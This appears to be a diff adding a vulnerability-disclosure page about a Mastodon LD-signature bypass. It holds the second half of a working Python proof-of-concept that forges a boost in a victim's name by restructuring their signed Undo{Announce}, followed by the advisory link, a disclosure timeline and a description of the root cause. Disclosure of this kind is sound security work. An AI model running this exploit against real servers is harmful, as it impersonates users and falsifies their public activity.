+    print(&quot;\n[*] Delivering forged activity to target inbox in 10 seconds...&quot;)
+    time.sleep(10)  # wait to ensure the original Undo{Announce} is fully processed first
+    print(f&quot;\n[&gt;] Delivering forged {forged['type']} to {TARGET_INBOX}&quot;)
+    print(f&quot;    actor  : {forged['actor']}&quot;)
+    print(f&quot;    object : {forged['object']}&quot;)
+    print(f&quot;    sig    : {forged['signature']['creator']} (reused, unmodified)&quot;)
+
+    resp = requests.post(TARGET_INBOX, data=body, headers=hdrs, timeout=15, verify=True)
+    print(f&quot;[&lt;] {resp.status_code} {resp.reason}&quot;)
+
+    if resp.status_code == 202:
+        print(&quot;[+] Accepted — check the target server for a forged boost&quot;)
+    else:
+        print(f&quot;[!] Unexpected response: {resp.text[:200]}&quot;)
+
+
+# ── ActivityPub endpoints ──────────────────────────────────────────────────────
+
+def ap_json(data):
+    return Response(json.dumps(data), content_type=&quot;application/activity+json&quot;)
+
+
+@app.get(&quot;/.well-known/webfinger&quot;)
+def webfinger():
+    return jsonify({
+        &quot;subject&quot;: f&quot;acct:attacker@{DOMAIN}&quot;,
+        &quot;links&quot;: [{
+            &quot;rel&quot;:  &quot;self&quot;,
+            &quot;type&quot;: &quot;application/activity+json&quot;,
+            &quot;href&quot;: ACTOR_URI,
+        }],
+    })
+
+
+@app.get(&quot;/users/attacker&quot;)
+def actor():
+    return ap_json({
+        &quot;@context&quot;:          AS_CONTEXT,
+        &quot;id&quot;:                ACTOR_URI,
+        &quot;type&quot;:              &quot;Person&quot;,
+        &quot;preferredUsername&quot;: &quot;attacker&quot;,
+        &quot;inbox&quot;:             f&quot;https://{DOMAIN}/users/attacker/inbox&quot;,
+        &quot;outbox&quot;:            f&quot;https://{DOMAIN}/users/attacker/outbox&quot;,
+        &quot;followers&quot;:         f&quot;https://{DOMAIN}/users/attacker/followers&quot;,
+        &quot;following&quot;:         f&quot;https://{DOMAIN}/users/attacker/following&quot;,
+        &quot;publicKey&quot;: {
+            &quot;id&quot;:           KEY_ID,
+            &quot;owner&quot;:        ACTOR_URI,
+            &quot;publicKeyPem&quot;: public_key_pem,
+        },
+    })
+
+
+@app.post(&quot;/users/attacker/inbox&quot;)
+@app.post(&quot;/inbox&quot;)
+def inbox():
+    try:
+        activity = json.loads(request.get_data())
+    except Exception:
+        return &quot;&quot;, 400
+
+    atype = activity.get(&quot;type&quot;, &quot;?&quot;)
+    actor = activity.get(&quot;actor&quot;, &quot;?&quot;)
+    print(f&quot;[+] Inbox: {atype} from {actor}&quot;)
+
+    # Ammunition detected: signed Undo wrapping an Announce
+    if (
+        atype == &quot;Undo&quot;
+        and isinstance(activity.get(&quot;signature&quot;), dict)
+        and isinstance(activity.get(&quot;object&quot;), dict)
+        and activity[&quot;object&quot;].get(&quot;type&quot;) == &quot;Announce&quot;
+    ):
+        print(&quot;[!] Signed Undo{Announce} — restructuring payload and firing&quot;)
+        forged = restructure(activity)
+        # Deliver in a background thread so we return 202 promptly
+        threading.Thread(target=deliver, args=(forged,), daemon=True).start()
+
+    # Accept everything else silently (Accept{Follow}, Undo{Follow}, etc.)
+    return &quot;&quot;, 202
+
+
+@app.get(&quot;/users/attacker/outbox&quot;)
+@app.get(&quot;/users/attacker/followers&quot;)
+@app.get(&quot;/users/attacker/following&quot;)
+def empty_collection():
+    return ap_json({
+        &quot;@context&quot;:    &quot;https://www.w3.org/ns/activitystreams&quot;,
+        &quot;type&quot;:        &quot;OrderedCollection&quot;,
+        &quot;totalItems&quot;:  0,
+        &quot;orderedItems&quot;: [],
+    })
+
+
+# ── Follow helper ──────────────────────────────────────────────────────────────
+
+def send_follow():
+    &quot;&quot;&quot;
+    Fetch the victim's actor to resolve their inbox, then POST a Follow activity.
+    Victim Server will respond with Accept{Follow} delivered to our inbox (handled above).
+    &quot;&quot;&quot;
+    print(f&quot;[*] Fetching victim actor: {VICTIM_URI}&quot;)
+    actor_data   = requests.get(
+        VICTIM_URI,
+        headers={&quot;Accept&quot;: &quot;application/activity+json&quot;},
+        timeout=10,
+    ).json()
+    victim_inbox = actor_data[&quot;inbox&quot;]
+
+    follow = {
+        &quot;@context&quot;: &quot;https://www.w3.org/ns/activitystreams&quot;,
+        &quot;id&quot;:       f&quot;https://{DOMAIN}/activities/follow-1&quot;,
+        &quot;type&quot;:     &quot;Follow&quot;,
+        &quot;actor&quot;:    ACTOR_URI,
+        &quot;object&quot;:   VICTIM_URI,
+    }
+    body = json.dumps(follow).encode()
+    hdrs = http_sign(&quot;POST&quot;, victim_inbox, body)
+
+    print(f&quot;[&gt;] Follow → {victim_inbox}&quot;)
+    resp = requests.post(victim_inbox, data=body, headers=hdrs, timeout=10)
+    print(f&quot;[&lt;] {resp.status_code} {resp.reason}&quot;)
+
+
+# ── Entrypoint ─────────────────────────────────────────────────────────────────
+
+if __name__ == &quot;__main__&quot;:
+    parser = argparse.ArgumentParser(
+        description=&quot;ANT-2026-04915 PoC — LD-signature bypass via @graph restructuring&quot;
+    )
+    parser.add_argument(
+        &quot;--domain&quot;, required=True,
+        help=&quot;Public domain of this server (e.g. attacker.example.com)&quot;
+    )
+    parser.add_argument(
+        &quot;--victim&quot;, required=True,
+        help=&quot;Victim actor URI (e.g. https://victim-server.example.com/@victim)&quot;
+    )
+    parser.add_argument(
+        &quot;--inbox&quot;, required=True,
+        help=&quot;Target inbox URI (e.g. https://target-server.example.com/inbox)&quot;
+    )
+    parser.add_argument(
+        &quot;--port&quot;, type=int, default=8080,
+        help=&quot;Local port to listen on (default: 8080)&quot;
+    )
+    parser.add_argument(
+        &quot;--follow&quot;, action=&quot;store_true&quot;,
+        help=&quot;Send a Follow activity to the victim on startup&quot;
+    )
+    args = parser.parse_args()
+
+    DOMAIN       = args.domain
+    ACTOR_URI    = f&quot;https://{DOMAIN}/users/attacker&quot;
+    KEY_ID       = f&quot;https://{DOMAIN}/users/attacker#main-key&quot;
+    VICTIM_URI   = args.victim
+    TARGET_INBOX = args.inbox
+
+    generate_keypair()
+    print(f&quot;[*] Actor  : {ACTOR_URI}&quot;)
+    print(f&quot;[*] Key ID : {KEY_ID}&quot;)
+
+    # Start Flask in a background thread before sending the Follow so that
+    # when server verifies the HTTP signature it can reach our actor endpoint.
+    flask_thread = threading.Thread(
+        target=lambda: app.run(host=&quot;0.0.0.0&quot;, port=args.port),
+        daemon=True,
+    )
+    flask_thread.start()
+    print(f&quot;[*] Listening on port {args.port} — waiting for Undo{{Announce}}...\n&quot;)
+
+    if args.follow:
+        time.sleep(2)  # give Flask a moment to bind
+        send_follow()
+
+    flask_thread.join()
+</code></pre>
+<h2>Attachment: <code>requirements.txt</code></h2>
+<pre tabindex="0"><code>cryptography
+flask
+requests
+</code></pre></div>
+
+
+
+<div class="marker">ADVISORY</div>
+<p class="kicker"><a href="https://github.com/mastodon/mastodon/security/advisories/GHSA-chgx-jx3p-rf73" rel="noopener noreferrer">https://github.com/mastodon/mastodon/security/advisories/GHSA-chgx-jx3p-rf73</a></p>
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-03-30</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-23</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-15</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-20</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">9b255d47046f22115964a5d2188f12d17def4a057f3320d558190a6ebfc554768f29aa76160aba8d0099888ce3dd07f03159591d6d091dad304e1ab223f2a950</p>
+<p class="kicker">Committed 2026-04-23 07:04 UTC</p>
+<p class="kicker">Revealed 2026-05-20 18:00 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-P2DWB2SK-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-P2DWB2SK%22%2C%22bug_class%22%3A%22Signature-bypass%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%2273c43f476878aad1%22%2C%22created_at%22%3A%222026-03-30T23%3A19%3A44%2B00%3A00%22%2C%22description%22%3A%22%60ActivityPub%3A%3ALinkedDataSignature%23verify_actor%21%60%20verifies%20signatures%20over%20the%20%2A%2ARDF%20canonicalization%2A%2A%20of%20a%20JSON-LD%20document%2C%20but%20Mastodon%20then%20%2A%2Adispatches%2A%2A%20on%20the%20raw%20JSON%20tree%20shape.%20These%20two%20views%20diverge%20for%20documents%20containing%20named%20%60%40graph%60%20blocks%2C%20because%20%60JsonLdHelper%23canonicalize%60%20pipes%20quads%20through%20%60RDF%3A%3AGraph.new%60%2C%20which%20silently%20strips%20graph%20names.%5Cn%5CnAn%20attacker%20who%20observes%20%2Aany%2A%20LD-signed%20activity%20with%20an%20embedded%20object%20%E2%80%94%20the%20canonical%20example%20being%20%60Undo%7BAnnounce%7D%60%20%28an%20unboost%29%20%E2%80%94%20can%20restructure%20the%20JSON%20to%20hoist%20the%20inner%20object%20%28%60Announce%60%29%20to%20the%20top%20level%20while%20pushing%20the%20outer%20wrapper%20%28%60Undo%60%29%20into%20a%20named%20%60%40graph%60.%20The%20signature%20bytes%20are%20%2A%2Areused%20unchanged%2A%2A%3B%20the%20RDF%20triple%20set%20is%20identical%3B%20%60verify_actor%21%60%20returns%20the%20victim%3B%20and%20%60ProcessCollectionService%60%20dispatches%20an%20%60Announce%60%20in%20the%20victim%27s%20name.%5Cn%5Cn%2A%2ADemonstrated%20impact%3A%2A%2A%20Convert%20a%20victim%27s%20%60Undo%7BAnnounce%7D%60%20%28unboost%29%20into%20an%20%60Announce%60%20%28boost%29%20attributed%20to%20the%20victim%2C%20persisted%20to%20the%20database%20and%20federated%20as%20a%20public%20status.%20The%20same%20technique%20applies%20to%20%60Undo%7BFollow%7D%60%2C%20%60Undo%7BLike%7D%60%2C%20%60Undo%7BBlock%7D%60%2C%20%60Reject%7BFollow%7D%60%20%E2%86%92%20%60Follow%60%2C%20etc.%20%E2%80%94%20any%20activity%20with%20a%20structurally%20complete%20embedded%20sub-activity.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3A%22app/lib/activitypub/linked_data_signature.rb%3A28%22%2C%22poc_sha256%22%3A%221ea154b5316d90a56209dab12e77121690df7629e6cc2814ba93544646847901%22%2C%22preimage_version%22%3A1%2C%22project%22%3A%22mastodon%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3A%22JsonLdHelper%23canonicalize%20does%20%60RDF%3A%3AGraph.new%20%3C%3C%20JSON%3A%3ALD%3A%3AAPI.toRdf%28json%29%60%3B%20RDF%3A%3AGraph%20represents%20a%20single%20unnamed%20graph%20and%20drops%20the%20graph_name%20component%20of%20incoming%20quads%2C%20so%20a%20document%20with%20the%20Undo%20moved%20into%20a%20named%20%40graph%20yields%20exactly%20the%20same%20URDNA2015%20N-Quads%20output%20and%20SHA-256%20document_hash%20as%20the%20original.%20The%20signature%20therefore%20covers%20the%20RDF%20triple%20set%2C%20not%20the%20JSON%20tree%20shape%20that%20Activity.factory%20actually%20dispatches%20on%2C%20and%20embedding%20vs.%20IRI-referencing%20a%20node%20produces%20the%20same%20triple%2C%20letting%20the%20attacker%20freely%20rearrange%20the%20tree.%22%2C%22title%22%3A%22LD-Signature%20bypass%20via%20JSON-LD%20named-graph%20restructuring%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-P2DWB2SK&#34;,
+  &#34;bug_class&#34;: &#34;Signature-bypass&#34;,
+  &#34;claude_severity&#34;: &#34;high&#34;,
+  &#34;commit_sha&#34;: &#34;73c43f476878aad1&#34;,
+  &#34;created_at&#34;: &#34;2026-03-30T23:19:44+00:00&#34;,
+  &#34;description&#34;: &#34;`ActivityPub::LinkedDataSignature#verify_actor!` verifies signatures over the **RDF canonicalization** of a JSON-LD document, but Mastodon then **dispatches** on the raw JSON tree shape. These two views diverge for documents containing named `@graph` blocks, because `JsonLdHelper#canonicalize` pipes quads through `RDF::Graph.new`, which silently strips graph names.\n\nAn attacker who observes *any* LD-signed activity with an embedded object — the canonical example being `Undo{Announce}` (an unboost) — can restructure the JSON to hoist the inner object (`Announce`) to the top level while pushing the outer wrapper (`Undo`) into a named `@graph`. The signature bytes are **reused unchanged**; the RDF triple set is identical; `verify_actor!` returns the victim; and `ProcessCollectionService` dispatches an `Announce` in the victim&#39;s name.\n\n**Demonstrated impact:** Convert a victim&#39;s `Undo{Announce}` (unboost) into an `Announce` (boost) attributed to the victim, persisted to the database and federated as a public status. The same technique applies to `Undo{Follow}`, `Undo{Like}`, `Undo{Block}`, `Reject{Follow}` → `Follow`, etc. — any activity with a structurally complete embedded sub-activity.&#34;,
+  &#34;discovered_at&#34;: null,
+  &#34;location&#34;: &#34;app/lib/activitypub/linked_data_signature.rb:28&#34;,
+  &#34;poc_sha256&#34;: &#34;1ea154b5316d90a56209dab12e77121690df7629e6cc2814ba93544646847901&#34;,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;mastodon&#34;,
+  &#34;reproduction&#34;: null,
+  &#34;technical_details&#34;: &#34;JsonLdHelper#canonicalize does `RDF::Graph.new &lt;&lt; JSON::LD::API.toRdf(json)`; RDF::Graph represents a single unnamed graph and drops the graph_name component of incoming quads, so a document with the Undo moved into a named @graph yields exactly the same URDNA2015 N-Quads output and SHA-256 document_hash as the original. The signature therefore covers the RDF triple set, not the JSON tree shape that Activity.factory actually dispatches on, and embedding vs. IRI-referencing a node produces the same triple, letting the attacker freely rearrange the tree.&#34;,
+  &#34;title&#34;: &#34;LD-Signature bypass via JSON-LD named-graph restructuring&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
